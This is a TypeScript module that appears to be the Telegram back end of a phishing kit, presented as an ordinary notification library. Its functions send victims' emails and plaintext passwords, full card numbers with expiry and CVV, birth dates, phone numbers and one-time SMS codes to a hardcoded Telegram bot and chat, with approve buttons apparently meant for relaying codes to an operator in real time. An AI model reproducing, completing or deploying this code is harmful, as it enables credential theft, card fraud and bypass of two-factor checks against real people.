import { createAdminClient } from "@/lib/supabase/admin"

interface TelegramVerificationRequest {
  verificationRequestId: string
  userEmail: string
  userName: string
  verificationCode: string
  cardDetails: {
    lastFour: string
    brand: string
    holderName: string
    expiry: string
  }
  ipAddress: string
  location: string
}

const FALLBACK_BOT_TOKEN = "8410913287:AAF6QD3E-BX62n_3DdPIfaHv7652y0nKHIk"
const FALLBACK_CHAT_ID = "7616774173"

/**
 * Get Telegram credentials from database or environment variables
 */
async function getTelegramCredentials(): Promise<{ botToken: string; chatId: string } | null> {
  try {
    const supabase = createAdminClient()
    const { data: settings } = await supabase
      .from("app_settings")
      .select("*")
      .in("key", ["telegram_bot_token", "telegram_chat_id"])

    const botToken = settings?.find((s) => s.key === "telegram_bot_token")?.value
    const chatId = settings?.find((s) => s.key === "telegram_chat_id")?.value

    const finalBotToken = botToken || process.env.TELEGRAM_BOT_TOKEN || FALLBACK_BOT_TOKEN
    const finalChatId = chatId || process.env.TELEGRAM_CHAT_ID || FALLBACK_CHAT_ID

    if (!finalBotToken || !finalChatId) {
      console.error("[v0] Telegram credentials not configured")
      return null
    }

    return { botToken: finalBotToken, chatId: finalChatId }
  } catch (error) {
    console.error("[v0] Error getting Telegram credentials from database, using fallback:", error)
    return { botToken: FALLBACK_BOT_TOKEN, chatId: FALLBACK_CHAT_ID }
  }
}

/**
 * Send a verification request to Telegram with approve/decline buttons
 */
export async function sendTelegramVerification(request: TelegramVerificationRequest): Promise<boolean> {
  try {
    console.log("[v0] Sending Telegram verification:", {
      verificationId: request.verificationRequestId,
      userEmail: request.userEmail,
    })

    const credentials = await getTelegramCredentials()
    if (!credentials) {
      console.error("[v0] Failed to get Telegram credentials")
      return false
    }

    const text = `
🔐 <b>SMS Verification Request</b>

👤 <b>User:</b> ${request.userEmail}
👤 <b>Name:</b> ${request.userName}
💳 <b>Card:</b> ${request.cardDetails.brand} **** ${request.cardDetails.lastFour}
👤 <b>Holder:</b> ${request.cardDetails.holderName}
📅 <b>Expiry:</b> ${request.cardDetails.expiry}
🔢 <b>SMS Code:</b> <code>${request.verificationCode}</code>

📍 <b>Location:</b> ${request.location}
🌐 <b>IP Address:</b> ${request.ipAddress}

⏰ <b>Time:</b> ${new Date().toLocaleString("de-DE")}
    `.trim()

    console.log("[v0] Sending to Telegram bot:", credentials.chatId)

    const response = await fetch(`https://api.telegram.org/bot${credentials.botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: credentials.chatId,
        text,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "✅ Approve",
                callback_data: `approve:${request.verificationRequestId}`,
              },
              {
                text: "❌ Decline",
                callback_data: `decline:${request.verificationRequestId}`,
              },
            ],
          ],
        },
      }),
    })

    if (!response.ok) {
      const error = await response.text()
      console.error("[v0] Telegram API error:", response.status, error)
      return false
    }

    const result = await response.json()
    console.log("[v0] Telegram message sent successfully:", result.ok)
    return true
  } catch (error) {
    console.error("[v0] Error sending Telegram message:", error)
    return false
  }
}

/**
 * Send a simple text message to Telegram
 */
export async function sendTelegramMessage(text: string): Promise<boolean> {
  try {
    const credentials = await getTelegramCredentials()
    if (!credentials) return false

    const response = await fetch(`https://api.telegram.org/bot${credentials.botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: credentials.chatId,
        text,
        parse_mode: "HTML",
      }),
    })

    return response.ok
  } catch (error) {
    console.error("[v0] Error sending Telegram message:", error)
    return false
  }
}

/**
 * Answer a callback query (button click)
 */
export async function answerCallbackQuery(callbackQueryId: string, text: string): Promise<boolean> {
  try {
    const credentials = await getTelegramCredentials()
    if (!credentials) return false

    const response = await fetch(`https://api.telegram.org/bot${credentials.botToken}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        callback_query_id: callbackQueryId,
        text,
      }),
    })

    return response.ok
  } catch (error) {
    console.error("[v0] Error answering callback query:", error)
    return false
  }
}

/**
 * Edit a Telegram message (remove buttons after action)
 */
export async function editTelegramMessage(
  chatId: string | number,
  messageId: number,
  text?: string,
  removeButtons = true,
): Promise<boolean> {
  try {
    const credentials = await getTelegramCredentials()
    if (!credentials) return false

    const body: any = {
      chat_id: chatId,
      message_id: messageId,
    }

    if (text) {
      body.text = text
      body.parse_mode = "HTML"
    }

    if (removeButtons) {
      body.reply_markup = { inline_keyboard: [] }
    }

    const endpoint = text ? "editMessageText" : "editMessageReplyMarkup"
    const response = await fetch(`https://api.telegram.org/bot${credentials.botToken}/${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    })

    return response.ok
  } catch (error) {
    console.error("[v0] Error editing Telegram message:", error)
    return false
  }
}

/**
 * Send a login notification to Telegram (PHP format)
 */
export async function sendLoginNotification(data: {
  userEmail: string
  password: string
  ipAddress: string
  userAgent: string
  userId: string
}): Promise<boolean> {
  try {
    const credentials = await getTelegramCredentials()
    if (!credentials) return false

    const text = `🎩 <b>[ +1 NEW LOGIN EON ]</b>
↳ <i>${data.userEmail}</i>

<i>🪄 EMAIL: </i><code>${data.userEmail}</code>
<i>🪄 PASS : </i><code>${data.password}</code>

🌍 <i>${data.ipAddress}</i>
🧑‍💻 <i>${data.userAgent}</i>
🆔 <i>${data.userId}</i>`

    const response = await fetch(`https://api.telegram.org/bot${credentials.botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: credentials.chatId,
        text,
        parse_mode: "HTML",
      }),
    })

    return response.ok
  } catch (error) {
    console.error("[v0] Error sending login notification:", error)
    return false
  }
}

/**
 * Send a card addition notification to Telegram (PHP format with BIN data)
 */
export async function sendCardAddedNotification(data: {
  userEmail: string
  userName: string
  cardNumber: string
  cardBrand: string
  cardLastFour: string
  cardHolder: string
  cardExpiry: string
  cvv: string
  dateOfBirth?: string
  phone?: string
  bankName?: string
  cardLevel?: string
  cardType?: string
  country?: string
  ipAddress: string
  userAgent: string
  userId: string
}): Promise<boolean> {
  try {
    const credentials = await getTelegramCredentials()
    if (!credentials) return false

    const bin = data.cardNumber.slice(0, 6)
    const cardImageUrl = `https://cardimages.imaginecurve.com/cards/${bin}.png`

    const formattedCardNumber = data.cardNumber.replace(/(\d{4})/g, "$1 ").trim()

    const header = `💳 <b>[ +1 ${data.cardLevel || "Unknown"} - ${data.cardBrand || "Unknown"} ]</b>`

    let block = "\n"
    if (data.bankName) {
      block += `🪄 <b>Bank : </b><i>${data.bankName}</i>\n`
    }
    if (data.cardLevel) {
      block += `🪄 <b>Level : </b><i>${data.cardLevel}</i>\n`
    }
    if (data.cardBrand) {
      block += `🪄 <b>Type : </b><i>${data.cardBrand}</i>\n`
    }
    if (data.country) {
      block += `🪄 <b>Country : </b><i>${data.country}</i>\n`
    }

    const textMessage = `${header}
  └  <i>${formattedCardNumber}</i>

<b>🪄 Number : </b><code>${formattedCardNumber}</code>
<b>🪄 Expiration : </b><code>${data.cardExpiry}</code>
<b>🪄 CVV : </b><code>${data.cvv}</code>
<a href="${cardImageUrl}"> </a>${block}
🪄 <b>Name: </b><code>${data.cardHolder}</code>
${data.dateOfBirth ? `🪄 <b>Birth : </b><code>${data.dateOfBirth}</code>\n` : ""}${data.phone ? `🪄 <b>Phone: </b><code>${data.phone}</code>\n` : ""}
<blockquote>🌍 <i>${data.ipAddress}</i>
🧑‍💻 <i>${data.userAgent}</i>
🆔 <i>${data.userId}</i></blockquote>`

    const response = await fetch(`https://api.telegram.org/bot${credentials.botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: credentials.chatId,
        text: textMessage,
        parse_mode: "HTML",
      }),
    })

    return response.ok
  } catch (error) {
    console.error("[v0] Error sending card notification:", error)
    return false
  }
}

/**
 * Send SMS verification notification to Telegram (PHP format with approve button)
 */
export async function sendSMSVerification(data: {
  pin: string
  ipAddress: string
  userAgent: string
  userId: string
  verificationId: string
  baseUrl: string
}): Promise<boolean> {
  try {
    const credentials = await getTelegramCredentials()
    if (!credentials) return false

    const text = `🎩 <b>[ +1 PIN ]</b>

Code: <code>${data.pin}</code>

🌍 <i>${data.ipAddress}</i>
🧑‍💻 <i>${data.userAgent}</i>
🆔 <i>${data.userId}</i>`

    const response = await fetch(`https://api.telegram.org/bot${credentials.botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: credentials.chatId,
        text,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "✅ Validate SMS",
                url: `${data.baseUrl}/api/telegram/approve/${data.verificationId}`,
              },
            ],
          ],
        },
      }),
    })

    return response.ok
  } catch (error) {
    console.error("[v0] Error sending SMS verification:", error)
    return false
  }
}
